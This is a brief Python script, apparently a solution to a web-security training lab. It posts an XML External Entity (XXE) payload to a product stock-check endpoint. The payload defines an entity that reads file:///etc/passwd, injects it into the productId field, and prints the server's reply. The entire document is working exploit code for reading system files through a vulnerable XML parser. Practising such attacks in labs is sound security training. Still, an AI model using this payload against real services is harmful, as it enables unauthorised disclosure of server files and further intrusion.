import requests

url = "https://0a240055034bb89f803ba81d008b0068.web-security-academy.net/product/stock"

payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY msg SYSTEM "file:///etc/passwd" > ]>
<stockCheck><productId>&msg;</productId><storeId>1</storeId></stockCheck>'''

response = requests.post(url, 
    data=payload,
    headers={"Content-Type": "application/xml"},
)

print(response.text)